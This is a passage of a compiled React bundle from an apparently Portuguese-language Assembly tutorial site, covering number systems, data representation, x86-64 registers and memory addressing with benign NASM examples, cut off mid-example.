AArch64"})]}),r.jsxs("tr",{children:[r.jsx("td",{children:"Educação / Open-source hardware"}),r.jsx("td",{children:"RISC-V"})]}),r.jsxs("tr",{children:[r.jsx("td",{children:"Jogos retro / consoles"}),r.jsx("td",{children:"MIPS, 68000, 6502"})]})]})]})]})}function Og(){return r.jsxs(L,{title:"Sistemas Numéricos",subtitle:"Binário, octal, hexadecimal e como o processador pensa em números",difficulty:"iniciante",timeToRead:"15 min",children:[r.jsx("p",{children:"Em Assembly, você vai trabalhar constantemente com diferentes bases numéricas. Dominar a conversão entre elas é fundamental — e mais simples do que parece."}),r.jsx("h2",{children:"Sistema Decimal (Base 10)"}),r.jsx("p",{children:"O sistema que usamos no dia a dia. Usa 10 dígitos: 0, 1, 2, 3, 4, 5, 6, 7, 8, 9. Cada posição é uma potência de 10:"}),r.jsx(d,{language:"bash",code:`# Exemplo: 4532
4 × 10³ = 4000
5 × 10² =  500
3 × 10¹ =   30
2 × 10⁰ =    2
Total   = 4532`}),r.jsx("h2",{children:"Sistema Binário (Base 2)"}),r.jsx("p",{children:"O processador trabalha internamente em binário — tudo são 0s e 1s (ausência ou presença de voltagem). Usa 2 dígitos: 0 e 1. Cada posição é uma potência de 2:"}),r.jsx(d,{language:"bash",code:`# Exemplo: 1011 em binário = 11 em decimal
1 × 2³ = 8
0 × 2² = 0
1 × 2¹ = 2
1 × 2⁰ = 1
Total  = 11`}),r.jsx("h3",{children:"Bits e Bytes"}),r.jsxs("ul",{children:[r.jsxs("li",{children:[r.jsx("strong",{children:"Bit:"})," 1 dígito binário (0 ou 1)"]}),r.jsxs("li",{children:[r.jsx("strong",{children:"Nibble:"})," 4 bits (0000 a 1111 → 0 a 15)"]}),r.jsxs("li",{children:[r.jsx("strong",{children:"Byte:"})," 8 bits (00000000 a 11111111 → 0 a 255)"]}),r.jsxs("li",{children:[r.jsx("strong",{children:"Word:"})," 16 bits (2 bytes → 0 a 65.535)"]}),r.jsxs("li",{children:[r.jsx("strong",{children:"Dword:"})," 32 bits (4 bytes → 0 a ~4 bilhões)"]}),r.jsxs("li",{children:[r.jsx("strong",{children:"Qword:"})," 64 bits (8 bytes → 0 a ~18 quintilhões)"]})]}),r.jsx("h2",{children:"Sistema Hexadecimal (Base 16)"}),r.jsx("p",{children:"Este é o sistema favorito dos programadores de baixo nível. Usa 16 dígitos: 0-9 e A-F (onde A=10, B=11, C=12, D=13, E=14, F=15)."}),r.jsxs("p",{children:["A razão é simples: ",r.jsx("strong",{children:"1 byte = 2 dígitos hexadecimais"}),". Muito mais compacto que binário!"]}),r.jsx(d,{language:"bash",code:`# Binário → Hexadecimal
# 1 nibble = 1 dígito hex
1111 = F = 15
1010 = A = 10
0101 = 5 = 5

# 11111010 (1 byte) em hex:
# 1111 = F, 1010 = A
11111010 = FA = 250 (decimal)

# Prefixos comuns para hex:
0xFF    # Prefixo em C/Assembly
$FF     # Prefixo em alguns assemblers  
FFh     # Sufixo em MASM/NASM`}),r.jsxs(T,{type:"info",title:"Por que hex?",children:["Um endereço de memória típico: ",r.jsx("code",{children:"0x7fff5fbff800"}),". Em binário seria: ",r.jsx("code",{children:"0111 1111 1111 1111 0101 1111 1011 1111 1111 1000 0000 0000"}),". Hex é MUITO mais legível."]}),r.jsx("h2",{children:"Tabela de Conversão Rápida"}),r.jsxs("table",{children:[r.jsx("thead",{children:r.jsxs("tr",{children:[r.jsx("th",{children:"Decimal"}),r.jsx("th",{children:"Binário"}),r.jsx("th",{children:"Hex"}),r.jsx("th",{children:"Octal"})]})}),r.jsx("tbody",{children:[[0,"0000","0","0"],[1,"0001","1","1"],[2,"0010","2","2"],[3,"0011","3","3"],[4,"0100","4","4"],[5,"0101","5","5"],[6,"0110","6","6"],[7,"0111","7","7"],[8,"1000","8","10"],[9,"1001","9","11"],[10,"1010","A","12"],[11,"1011","B","13"],[12,"1100","C","14"],[13,"1101","D","15"],[14,"1110","E","16"],[15,"1111","F","17"]].map(([i,l,u,m])=>r.jsxs("tr",{children:[r.jsx("td",{children:i}),r.jsx("td",{children:l}),r.jsx("td",{children:u}),r.jsx("td",{children:m})]},String(i)))})]}),r.jsx("h2",{children:"Conversões Práticas"}),r.jsx("h3",{children:"Decimal → Binário (divisões por 2)"}),r.jsx(d,{language:"bash",code:`# Converter 42 para binário:
42 ÷ 2 = 21 resto 0
21 ÷ 2 = 10 resto 1
10 ÷ 2 =  5 resto 0
 5 ÷ 2 =  2 resto 1
 2 ÷ 2 =  1 resto 0
 1 ÷ 2 =  0 resto 1

# Lendo os restos de baixo para cima:
42 (decimal) = 101010 (binário) = 0x2A (hex)`}),r.jsx("h3",{children:"Hex → Decimal"}),r.jsx(d,{language:"bash",code:`# 0xFF = ?
F = 15, F = 15
15 × 16¹ + 15 × 16⁰ = 240 + 15 = 255

# 0x1A4 = ?
1 × 16² + A(10) × 16¹ + 4 × 16⁰
= 256 + 160 + 4 = 420`}),r.jsx("h2",{children:"Operações Bit a Bit (Bitwise)"}),r.jsx("p",{children:"Assembly usa muito operações bit a bit. Entendê-las é crucial:"}),r.jsx("h3",{children:"AND (&) — Ambos precisam ser 1"}),r.jsx(d,{language:"bash",code:`  1100 (12)
& 1010 (10)
-------
  1000 (8)

Uso prático: Mascarar bits (isolar certos bits)
byte & 0x0F → pega só o nibble baixo`}),r.jsx("h3",{children:"OR (|) — Pelo menos um precisa ser 1"}),r.jsx(d,{language:"bash",code:`  1100 (12)
| 1010 (10)
-------
  1110 (14)

Uso prático: Setar bits específicos
byte | 0x80 → seta o bit mais significativo`}),r.jsx("h3",{children:"XOR (^) — Exatamente um precisa ser 1"}),r.jsx(d,{language:"bash",code:`  1100 (12)
^ 1010 (10)
-------
  0110 (6)

Uso prático: Toggle bits, zerar registrador (xor eax, eax)
a ^ a = 0 (sempre!)`}),r.jsx("h3",{children:"NOT (~) — Inverte todos os bits"}),r.jsx(d,{language:"bash",code:`~1010 1100 = 0101 0011

Uso prático: Complemento de 1, criação de máscaras`}),r.jsx("h3",{children:"Shift Left (SHL / <<) — Multiplica por 2"}),r.jsx(d,{language:"bash",code:`0001 << 1 = 0010 (1 × 2 = 2)
0001 << 3 = 1000 (1 × 8 = 8)
0011 << 2 = 1100 (3 × 4 = 12)

Muito mais rápido que MUL para potências de 2!`}),r.jsx("h3",{children:"Shift Right (SHR / >>) — Divide por 2"}),r.jsx(d,{language:"bash",code:`1000 >> 1 = 0100 (8 ÷ 2 = 4)
1000 >> 2 = 0010 (8 ÷ 4 = 2)

SHR é divisão sem sinal, SAR é divisão com sinal`}),r.jsx("h2",{children:"Dicas práticas"}),r.jsx(d,{language:"nasm",filename:"numericos.asm",code:`; Notações em NASM
mov rax, 42          ; decimal
mov rax, 0x2A        ; hexadecimal (prefixo 0x)
mov rax, 2Ah         ; hexadecimal (sufixo h — deve começar com dígito!)
mov rax, 0b00101010  ; binário (prefixo 0b)
mov rax, 101010b     ; binário (sufixo b)
mov rax, 52o         ; octal (sufixo o)

; Zerar registrador com XOR (otimização clássica)
xor rax, rax         ; rax = 0 (mais rápido que mov rax, 0!)

; Multiplicar por 4 com shift
shl rax, 2           ; rax = rax * 4

; Isolar byte mais baixo
and rax, 0xFF        ; pega só os 8 bits menos significativos`})]})}function Dg(){return r.jsxs(L,{title:"Representação de Dados",subtitle:"Como inteiros, floats, chars e strings vivem na memória",difficulty:"iniciante",timeToRead:"12 min",children:[r.jsx("p",{children:'Um processador não sabe o que é "número" ou "texto" — ele só vê bytes. A interpretação de um byte como inteiro, float ou caractere é uma convenção que nós, programadores, estabelecemos. Em Assembly, você é responsável por essa interpretação.'}),r.jsx("h2",{children:"Inteiros sem sinal (Unsigned)"}),r.jsx("p",{children:"Representação direta em binário. Todos os bits são usados para o valor positivo:"}),r.jsxs("table",{children:[r.jsx("thead",{children:r.jsxs("tr",{children:[r.jsx("th",{children:"Tipo"}),r.jsx("th",{children:"Bits"}),r.jsx("th",{children:"Mínimo"}),r.jsx("th",{children:"Máximo"})]})}),r.jsxs("tbody",{children:[r.jsxs("tr",{children:[r.jsx("td",{children:"byte"}),r.jsx("td",{children:"8"}),r.jsx("td",{children:"0"}),r.jsx("td",{children:"255"})]}),r.jsxs("tr",{children:[r.jsx("td",{children:"word"}),r.jsx("td",{children:"16"}),r.jsx("td",{children:"0"}),r.jsx("td",{children:"65.535"})]}),r.jsxs("tr",{children:[r.jsx("td",{children:"dword"}),r.jsx("td",{children:"32"}),r.jsx("td",{children:"0"}),r.jsx("td",{children:"4.294.967.295"})]}),r.jsxs("tr",{children:[r.jsx("td",{children:"qword"}),r.jsx("td",{children:"64"}),r.jsx("td",{children:"0"}),r.jsx("td",{children:"18.446.744.073.709.551.615"})]})]})]}),r.jsx("h2",{children:"Inteiros com sinal — Complemento de Dois"}),r.jsx("p",{children:"A forma mais comum de representar números negativos. O bit mais significativo (MSB) indica o sinal: 0 = positivo, 1 = negativo."}),r.jsxs("p",{children:["Para obter o negativo de um número: ",r.jsx("strong",{children:"inverta todos os bits e some 1"}),"."]}),r.jsx(d,{language:"bash",code:`# Como representar -5 em 8 bits?
+5 em binário:   0000 0101
Inverter bits:   1111 1010
Somar 1:       + 0000 0001
Resultado (-5):  1111 1011

# Verificação: -5 + 5 = 0
  1111 1011  (-5)
+ 0000 0101  (+5)
-----------
1 0000 0000  (overflow descartado = 0) ✓`}),r.jsxs("table",{children:[r.jsx("thead",{children:r.jsxs("tr",{children:[r.jsx("th",{children:"Tipo"}),r.jsx("th",{children:"Bits"}),r.jsx("th",{children:"Mínimo"}),r.jsx("th",{children:"Máximo"})]})}),r.jsxs("tbody",{children:[r.jsxs("tr",{children:[r.jsx("td",{children:"byte"}),r.jsx("td",{children:"8"}),r.jsx("td",{children:"-128"}),r.jsx("td",{children:"127"})]}),r.jsxs("tr",{children:[r.jsx("td",{children:"word"}),r.jsx("td",{children:"16"}),r.jsx("td",{children:"-32.768"}),r.jsx("td",{children:"32.767"})]}),r.jsxs("tr",{children:[r.jsx("td",{children:"dword"}),r.jsx("td",{children:"32"}),r.jsx("td",{children:"-2.147.483.648"}),r.jsx("td",{children:"2.147.483.647"})]}),r.jsxs("tr",{children:[r.jsx("td",{children:"qword"}),r.jsx("td",{children:"64"}),r.jsx("td",{children:"-9.223.372.036.854.775.808"}),r.jsx("td",{children:"9.223.372.036.854.775.807"})]})]})]}),r.jsx(T,{type:"warning",title:"Overflow silencioso",children:'Em Assembly não existe "exception por overflow". Se você somar 127 + 1 em um byte com sinal, você obtém -128. O processador seta a flag OF (Overflow Flag) mas não para a execução — você precisa verificar manualmente.'}),r.jsx("h2",{children:"Ponto Flutuante (IEEE 754)"}),r.jsx("p",{children:"Floats são representados no padrão IEEE 754. Um float de 32 bits tem:"}),r.jsxs("ul",{children:[r.jsxs("li",{children:[r.jsx("strong",{children:"1 bit de sinal:"})," 0 = positivo, 1 = negativo"]}),r.jsxs("li",{children:[r.jsx("strong",{children:"8 bits de expoente:"})," com bias de 127"]}),r.jsxs("li",{children:[r.jsx("strong",{children:"23 bits de mantissa:"})," a parte fracionária"]})]}),r.jsx(d,{language:"bash",code:`# Representação de 3.14 em IEEE 754 single (32-bit):
# Sinal: 0 (positivo)
# 3.14 ≈ 1.1001000111101011100001 × 2^1
# Expoente: 1 + 127 = 128 = 10000000
# Mantissa: 10010001111010111000011

# Resultado: 0 10000000 10010001111010111000011
# Em hex: 0x4048F5C3`}),r.jsx("p",{children:"Em Assembly x86-64, operações de float usam:"}),r.jsxs("ul",{children:[r.jsxs("li",{children:[r.jsx("strong",{children:"Registradores XMM:"})," Para SSE/SSE2 (scalar e SIMD)"]}),r.jsxs("li",{children:[r.jsx("strong",{children:"Registradores x87 (ST0-ST7):"})," FPU legado, 80-bit extended precision"]})]}),r.jsx("h2",{children:"Caracteres e Strings"}),r.jsx("h3",{children:"ASCII"}),r.jsx("p",{children:"O padrão mais simples: cada caractere é 1 byte (7 bits significativos, valores 0-127)."}),r.jsx(d,{language:"bash",code:`# Tabela ASCII parcial:
65 = 'A',  66 = 'B',  67 = 'C'
97 = 'a',  98 = 'b',  99 = 'c'
48 = '0',  49 = '1',  50 = '2'
32 = ' ' (espaço)
10 = '
' (newline)
0  = '\0' (null terminator)`}),r.jsx("h3",{children:"Strings em Assembly"}),r.jsxs("p",{children:["Strings em Assembly são sequências de bytes terminadas por ",r.jsx("code",{children:"0"})," (null terminator), assim como em C:"]}),r.jsx(d,{language:"nasm",filename:"strings.asm",code:`section .data
    mensagem db "Hello, World!", 10, 0
    ;          ^ string literal     ^newline ^null terminator

    ; Alternativa equivalente:
    msg2 db 'H','e','l','l','o',10,0

    ; Vários jeitos de declarar:
    nome db "João", 0           ; string UTF-8
    tamanho equ $ - mensagem    ; calcula o tamanho`}),r.jsx("h2",{children:"Little-Endian vs Big-Endian"}),r.jsxs("p",{children:["x86-64 é ",r.jsx("strong",{children:"little-endian"}),": o byte menos significativo é armazenado no endereço mais baixo."]}),r.jsx(d,{language:"bash",code:`# Valor 0x12345678 armazenado na memória:
# Endereço: 0x1000 0x1001 0x1002 0x1003

# Little-endian (x86):
#            78    56    34    12
# Leitura de menor para maior endereço: 78 56 34 12

# Big-endian (ARM antigo, PowerPC, redes):
#            12    34    56    78

# IMPORTANTE: Dados de rede (TCP/IP) são BIG-ENDIAN!
# Por isso existe htons(), htonl() em C para converter.`}),r.jsxs(T,{type:"danger",title:"Armadilha do endian",children:["Ao ler dados de rede ou arquivos com formato big-endian em x86-64, você precisa inverter os bytes. A instrução ",r.jsx("code",{children:"BSWAP"})," do x86-64 inverte a ordem dos bytes de um registrador de 32 ou 64 bits."]}),r.jsx("h2",{children:"Tamanhos de Dados em NASM"}),r.jsx(d,{language:"nasm",filename:"tamanhos.asm",code:`section .data
    b  db 42          ; byte  (8 bits)  — define byte
    w  dw 1000        ; word  (16 bits) — define word
    d  dd 100000      ; dword (32 bits) — define doubleword
    q  dq 1000000000  ; qword (64 bits) — define quadword

section .bss
    buf_byte  resb 1  ; reserva 1 byte
    buf_word  resw 1  ; reserva 1 word
    buf_dword resd 1  ; reserva 1 dword
    buf_qword resq 1  ; reserva 1 qword
    buffer    resb 64 ; reserva 64 bytes (buffer)`}),r.jsx("h2",{children:"Instrução MOVZX e MOVSX"}),r.jsx(d,{language:"nasm",filename:"extensao.asm",code:`; MOVZX — Move com extensão zero (unsigned)
movzx rax, byte [mem]   ; rax = zero-extend(byte) — preenche com zeros
movzx rax, word [mem]   ; rax = zero-extend(word)

; MOVSX — Move com extensão de sinal (signed)
movsx rax, byte [mem]   ; rax = sign-extend(byte) — propaga o bit de sinal
movsx rax, word [mem]   ; rax = sign-extend(word)

; Exemplo:
; byte = 0xFF = 255 (unsigned) ou -1 (signed)
movzx rax, byte [mem]   ; rax = 0x00000000000000FF = 255
movsx rax, byte [mem]   ; rax = 0xFFFFFFFFFFFFFFFF = -1`})]})}function Tg(){return r.jsxs(L,{title:"Registradores x86-64",subtitle:"As variáveis do processador — rápidos, limitados e poderosos",difficulty:"iniciante",timeToRead:"20 min",children:[r.jsxs("p",{children:["Registradores são ",r.jsx("strong",{children:"armazenamentos internos do processador"}),". São extremamente rápidos (sem latência de memória) mas em número limitado. Em x86-64, existem 16 registradores gerais de 64 bits, além de registradores especiais."]}),r.jsx("h2",{children:"Registradores de Propósito Geral (64-bit)"}),r.jsxs("table",{children:[r.jsx("thead",{children:r.jsxs("tr",{children:[r.jsx("th",{children:"64-bit"}),r.jsx("th",{children:"32-bit"}),r.jsx("th",{children:"16-bit"}),r.jsx("th",{children:"8-bit alto"}),r.jsx("th",{children:"8-bit baixo"}),r.jsx("th",{children:"Uso convencional"})]})}),r.jsx("tbody",{children:[["RAX","EAX","AX","AH","AL","Acumulador / valor de retorno / syscall number"],["RBX","EBX","BX","BH","BL","Base (preserved across calls)"],["RCX","ECX","CX","CH","CL","Contador / 4º argumento"],["RDX","EDX","DX","DH","DL","Dados / 3º argumento"],["RSI","ESI","SI","-","SIL","Source Index / 2º argumento"],["RDI","EDI","DI","-","DIL","Destination Index / 1º argumento"],["RSP","ESP","SP","-","SPL","Stack Pointer (topo da stack)"],["RBP","EBP","BP","-","BPL","Base Pointer (frame da stack)"],["R8","R8D","R8W","-","R8B","5º argumento"],["R9","R9D","R9W","-","R9B","6º argumento"],["R10","R10D","R10W","-","R10B","Temporário"],["R11","R11D","R11W","-","R11B","Temporário"],["R12","R12D","R12W","-","R12B","Preserved (callee-saved)"],["R13","R13D","R13W","-","R13B","Preserved (callee-saved)"],["R14","R14D","R14W","-","R14B","Preserved (callee-saved)"],["R15","R15D","R15W","-","R15B","Preserved (callee-saved)"]].map(([i,l,u,m,f,j])=>r.jsxs("tr",{children:[r.jsx("td",{children:r.jsx("code",{children:i})}),r.jsx("td",{children:r.jsx("code",{children:l})}),r.jsx("td",{children:r.jsx("code",{children:u})}),r.jsx("td",{children:r.jsx("code",{children:m})}),r.jsx("td",{children:r.jsx("code",{children:f})}),r.jsx("td",{children:j})]},i))})]}),r.jsx("h2",{children:"Partes do Mesmo Registrador"}),r.jsxs("p",{children:["Os nomes diferentes (RAX, EAX, AX, AL, AH) referem-se a ",r.jsx("strong",{children:"partes do mesmo registrador físico"}),":"]}),r.jsx(d,{language:"bash",code:`RAX (64-bit):  [63.....32][31.....16][15..8][7....0]
                               EAX (32)
                                         AX (16)
                                         AH (8)  AL (8)

# Se RAX = 0x1122334455667788:
# EAX = 0x55667788
# AX  = 0x7788
# AH  = 0x77
# AL  = 0x88`}),r.jsxs(T,{type:"warning",title:"Comportamento de escrita em 32-bit",children:["Escrever em EAX (32-bit) automaticamente ",r.jsx("strong",{children:"zera os 32 bits superiores de RAX"}),". Mas escrever em AX (16-bit) ou AL/AH (8-bit) NÃO zera os bits superiores. Isso pode causar bugs sutis!"]}),r.jsx(d,{language:"nasm",filename:"registradores.asm",code:`mov rax, 0xFFFFFFFFFFFFFFFF   ; rax = -1 (todos os bits 1)
mov eax, 0x12345678            ; rax = 0x0000000012345678 ← zeros automáticos!
mov ax, 0xABCD                 ; rax = 0x000000001234ABCD ← superiores intactos!
mov al, 0xFF                   ; rax = 0x000000001234ABFF ← superiores intactos!`}),r.jsx("h2",{children:"Registrador RIP (Instruction Pointer)"}),r.jsxs("p",{children:["Também chamado de ",r.jsx("strong",{children:"Program Counter"}),". Aponta para a próxima instrução a ser executada. Você não pode usar RIP como registrador geral, mas pode referenciar memória relativa a ele:"]}),r.jsx(d,{language:"nasm",filename:"rip.asm",code:`; Endereçamento relativo ao RIP (x86-64 específico)
lea rax, [rel mensagem]    ; rax = endereço de 'mensagem' relativo ao RIP
mov rax, [rel variavel]    ; lê variável com endereçamento relativo`}),r.jsx("h2",{children:"Registrador RFLAGS"}),r.jsx("p",{children:'Um registrador de 64 bits onde cada bit é uma "flag" que reflete o resultado de operações anteriores:'}),r.jsxs("table",{children:[r.jsx("thead",{children:r.jsxs("tr",{children:[r.jsx("th",{children:"Flag"}),r.jsx("th",{children:"Bit"}),r.jsx("th",{children:"Nome"}),r.jsx("th",{children:"Descrição"})]})}),r.jsxs("tbody",{children:[r.jsxs("tr",{children:[r.jsx("td",{children:"CF"}),r.jsx("td",{children:"0"}),r.jsx("td",{children:"Carry Flag"}),r.jsx("td",{children:"Resultado gerou carry/borrow (unsigned overflow)"})]}),r.jsxs("tr",{children:[r.jsx("td",{children:"PF"}),r.jsx("td",{children:"2"}),r.jsx("td",{children:"Parity Flag"}),r.jsx("td",{children:"Número de bits 1 no byte baixo é par"})]}),r.jsxs("tr",{children:[r.jsx("td",{children:"AF"}),r.jsx("td",{children:"4"}),r.jsx("td",{children:"Aux Carry"}),r.jsx("td",{children:"Carry no nibble baixo (BCD)"})]}),r.jsxs("tr",{children:[r.jsx("td",{children:"ZF"}),r.jsx("td",{children:"6"}),r.jsx("td",{children:"Zero Flag"}),r.jsx("td",{children:"Resultado foi zero"})]}),r.jsxs("tr",{children:[r.jsx("td",{children:"SF"}),r.jsx("td",{children:"7"}),r.jsx("td",{children:"Sign Flag"}),r.jsx("td",{children:"Resultado foi negativo (bit mais alto = 1)"})]}),r.jsxs("tr",{children:[r.jsx("td",{children:"TF"}),r.jsx("td",{children:"8"}),r.jsx("td",{children:"Trap Flag"}),r.jsx("td",{children:"Single-step para debugging"})]}),r.jsxs("tr",{children:[r.jsx("td",{children:"IF"}),r.jsx("td",{children:"9"}),r.jsx("td",{children:"Interrupt Enable"}),r.jsx("td",{children:"Interrupções habilitadas"})]}),r.jsxs("tr",{children:[r.jsx("td",{children:"DF"}),r.jsx("td",{children:"10"}),r.jsx("td",{children:"Direction Flag"}),r.jsx("td",{children:"Direção das operações de string"})]}),r.jsxs("tr",{children:[r.jsx("td",{children:"OF"}),r.jsx("td",{children:"11"}),r.jsx("td",{children:"Overflow Flag"}),r.jsx("td",{children:"Overflow em operação com sinal"})]})]})]}),r.jsx("h2",{children:"Registradores de Segmento"}),r.jsx("p",{children:"Herança do modo real x86. Em modo 64-bit, a maioria é ignorada exceto FS e GS que são usados para thread-local storage:"}),r.jsx(d,{language:"bash",code:`CS — Code Segment (segmento de código)
DS — Data Segment (segmento de dados)
SS — Stack Segment (segmento da stack)
ES — Extra Segment
FS — Extra Segment 2 (thread-local storage no Linux)
GS — Extra Segment 3 (thread-local storage no Windows)`}),r.jsx("h2",{children:"Registradores de Controle"}),r.jsx("p",{children:"Usados apenas no kernel (ring 0), não em código de usuário:"}),r.jsx(d,{language:"bash",code:`CR0 — Controle do modo do processador (real/protegido/paginação)
CR2 — Endereço que causou page fault
CR3 — Endereço do Page Table Directory
CR4 — Features estendidas (SSE, PAE, etc.)
EFER — Extended Feature Enable Register (long mode, NX bit)`}),r.jsx("h2",{children:"Registradores SIMD"}),r.jsx("p",{children:"Para operações vetoriais (SSE/AVX):"}),r.jsxs("ul",{children:[r.jsxs("li",{children:[r.jsx("strong",{children:"XMM0-XMM15:"})," 128 bits cada. SSE/SSE2. Scalar float/double ou 4×float, 2×double, 16×byte, etc."]}),r.jsxs("li",{children:[r.jsx("strong",{children:"YMM0-YMM15:"})," 256 bits cada (inclui XMM nos bits baixos). Requer AVX."]}),r.jsxs("li",{children:[r.jsx("strong",{children:"ZMM0-ZMM31:"})," 512 bits cada (inclui YMM nos bits baixos). Requer AVX-512."]})]}),r.jsx(d,{language:"nasm",filename:"simd_regs.asm",code:`; Carregar 4 floats em XMM0 de uma vez
movaps xmm0, [floats]    ; Carrega 4 floats alinhados (128 bits)
addps  xmm0, xmm1        ; Soma os 4 pares de floats simultaneamente!

; Resultado: 4 somas com 1 instrução (SIMD = Single Instruction Multiple Data)`}),r.jsx("h2",{children:"Convenção de uso (System V AMD64)"}),r.jsx("p",{children:"No Linux/Mac, a convenção de chamada define quem salva quais registradores:"}),r.jsx(d,{language:"bash",code:`# Caller-saved (quem chama deve salvar se precisar):
# RAX, RCX, RDX, RSI, RDI, R8, R9, R10, R11
# XMM0-XMM15

# Callee-saved (quem é chamado deve restaurar):
# RBX, RBP, R12, R13, R14, R15

# Argumentos de função (em ordem):
# 1º: RDI
# 2º: RSI
# 3º: RDX
# 4º: RCX
# 5º: R8
# 6º: R9
# 7º+: na stack

# Retorno:
# Inteiro: RAX (e RDX para valores de 128 bits)
# Float: XMM0`})]})}function qg(){return r.jsxs(L,{title:"Memória e Endereçamento",subtitle:"Como o processador acessa a memória RAM em x86-64",difficulty:"intermediario",timeToRead:"18 min",children:[r.jsx("p",{children:"Em Assembly, você gerencia a memória diretamente. Não há garbage collector, não há abstrações — você controla exatamente onde os dados ficam e como são acessados."}),r.jsx("h2",{children:"Modelo de Memória Virtual"}),r.jsxs("p",{children:["Em sistemas modernos, cada processo tem seu próprio ",r.jsx("strong",{children:"espaço de endereçamento virtual"})," — uma ilusão de que tem acesso a toda a memória. O kernel (com ajuda da MMU) mapeia endereços virtuais para endereços físicos."]}),r.jsx(d,{language:"bash",code:`# Layout típico de memória virtual em Linux x86-64:
# (endereços crescem de baixo para cima)

0x0000000000000000    # Endereço null (acesso causa segfault)
       ...
0x0000000000400000    # Código do programa (.text)
0x0000000000600000    # Dados inicializados (.data)
0x0000000000601000    # Dados não inicializados (.bss)
       ...
0x0000000001234000    # Heap (cresce para cima com brk/mmap)
       ...
0x00007fff00000000    # Stack (cresce para baixo!)
0x00007fffffff0000    # Argumentos e variáveis de ambiente
0xFFFF800000000000    # Espaço do kernel (inacessível para userspace)`}),r.jsx("h2",{children:"Modos de Endereçamento x86-64"}),r.jsxs("p",{children:["x86-64 tem modos de endereçamento muito flexíveis. A sintaxe NASM usa colchetes ",r.jsx("code",{children:"[]"})," para indicar acesso à memória:"]}),r.jsx("h3",{children:"1. Imediato (Immediate)"}),r.jsx(d,{language:"nasm",code:"mov rax, 42        ; rax = 42 (constante, não acessa memória)"}),r.jsx("h3",{children:"2. Registrador (Register)"}),r.jsx(d,{language:"nasm",code:"mov rax, rbx       ; rax = rbx (copia de registrador para registrador)"}),r.jsx("h3",{children:"3. Direto (Direct / Absolute)"}),r.jsx(d,{language:"nasm",code:`mov rax, [0x601000]       ; rax = *((qword*)0x601000) — acessa endereço fixo
mov rax, [variavel]       ; rax = conteúdo da variável`}),r.jsx("h3",{children:"4. Indireto por Registrador"}),r.jsx(d,{language:"nasm",code:`mov rax, [rbx]     ; rax = *(rbx) — lê da memória apontada por rbx
mov [rdx], rax     ; *(rdx) = rax — escreve na memória apontada por rdx`}),r.jsx("h3",{children:"5. Base + Deslocamento"}),r.jsx(d,{language:"nasm",code:`mov rax, [rbx + 8]       ; rax = *(rbx + 8)
mov rax, [rbp - 16]      ; rax = *(rbp - 16) — variável local na stack
mov rax, [rbx + 0x20]    ; deslocamento em hex`}),r.jsx("h3",{children:"6. Base + Índice × Escala"}),r.jsx(d,{language:"nasm",code:`; Fórmula: base + índice * escala + deslocamento
; Escala pode ser: 1, 2, 4, ou 8

mov rax, [rbx + rcx*8]         ; rax = *(rbx + rcx*8)   — array de qwords
mov rax, [rbx + rcx*4 + 16]    ; rax = *(rbx + rcx*4 + 16) — struct array

; Acesso a elemento de array:
; array[i] onde array é int (4 bytes)
; lea rdx, [array]          ; rdx = endereço base do array
; mov eax, [rdx + rsi*4]    ; rax = array[rsi]`}),r.jsxs(T,{type:"info",title:"A instrução LEA",children:[r.jsx("code",{children:"LEA"})," (Load Effective Address) calcula o endereço mas NÃO acessa a memória. É como fazer o cálculo entre colchetes sem ler o conteúdo. Muito útil para aritmética rápida!"]}),r.jsx(d,{language:"nasm",filename:"lea.asm",code:`lea rax, [rbx + 16]    ; rax = rbx + 16  (aritmética, não memória!)
lea rax, [rbx*4 + rbx] ; rax = rbx*5     (truque de multiplicação!)
lea rax, [variavel]    ; rax = endereço de 'variavel'`}),r.jsx("h2",{children:"Especificadores de Tamanho"}),r.jsx("p",{children:"Ao acessar memória, você precisa especificar o tamanho:"}),r.jsx(d,{language:"nasm",filename:"tamanhos_mem.asm",code:`mov rax, [rbx]          ; 64-bit (ambíguo se destino for claro)
mov rax, qword [rbx]    ; 64-bit explícito — lê 8 bytes
mov eax, dword [rbx]    ; 32-bit — lê 4 bytes
mov ax,  word  [rbx]    ; 16-bit — lê 2 bytes
mov al,  byte  [rbx]    ; 8-bit  — lê 1 byte

; NECESSÁRIO quando destino não deixa claro o tamanho:
mov byte  [rbx], 42     ; escreve 1 byte
mov word  [rbx], 42     ; escreve 2 bytes
mov dword [rbx], 42     ; escreve 4 bytes
mov qword [rbx], 42     ; escreve 8 bytes`}),r.jsx("h2",{children:"A Stack (Pilha)"}),r.jsxs("p",{children:["A stack é uma região de memória que ",r.jsx("strong",{children:"cresce para baixo"})," em x86-64. RSP (Stack Pointer) aponta para o topo (o byte mais recentemente empilhado)."]}),r.jsx(d,{language:"nasm",filename:"stack.asm",code:`; PUSH: diminui RSP em 8 e escreve o valor
push rax    ; equivalente a: sub rsp, 8; mov [rsp], rax

; POP: lê o valor e aumenta RSP em 8
pop rbx     ; equivalente a: mov rbx, [rsp]; add rsp, 8

; Exemplo de stack:
; RSP inicial: 0x7fff5000

push rax    ; RSP = 0x7fff4FF8  ← topo da stack
push rbx    ; RSP = 0x7fff4FF0
push rcx    ; RSP = 0x7fff4FE8

; Memória (crescendo para baixo):
; 0x7fff4FE8 → rcx  (topo — RSP aponta aqui)
; 0x7fff4FF0 → rbx
; 0x7fff4FF8 → rax

pop rcx     ; RSP = 0x7fff4FF0
pop rbx     ; RSP = 0x7fff4FF8
pop rax     ; RSP = 0x7fff5000  ← volta ao original`}),r.jsx(T,{type:"warning",title:"Stack Alignment",children:"Em x86-64 (System V AMD64 ABI), a stack deve estar alinhada em 16 bytes antes de uma instrução CALL. Caso contrário, instruções SIMD podem causar falhas. O compilador cuida disso automaticamente — você precisa cuidar ao chamar funções manualmente."}),r.jsx("h2",{children:"Acesso a Arrays em Memória"}),r.jsx(d,{language:"nasm",filename:"arrays.asm",code:`section .data
    array dq 10, 20, 30, 40, 50   ; array de 5 qwords (8 bytes cada)

section .text
    ; Acessar array[2] (terceiro elemento, índice base-0)
    lea rbx, [array]              ; rbx = endereço base do array
    mov rax, [rbx + 2*8]         ; rax = array[2] = 30

    ; Loop pelo array
    xor rcx, rcx                  ; rcx = 0 (índice)
.loop:
    mov rax, [rbx + rcx*8]       ; rax = array[rcx]
    ; ... processar rax ...
    inc rcx
    cmp rcx, 5                    ; array tem 5 elementos
    jl .loop                      ; loop enquanto rcx < 5`}),r.jsx("h2",{children:"Heap e Alocação Dinâmica"}),r.jsx("p",{children:"Em Assembly puro, você pode usar syscalls para alocar memória no heap:"}),r.jsx(d,{language:"nasm",filename:"heap.asm",code:`; mmap — mapear memória anonima (equivalente ao malloc)
mov rax, 9           ; syscall: mmap
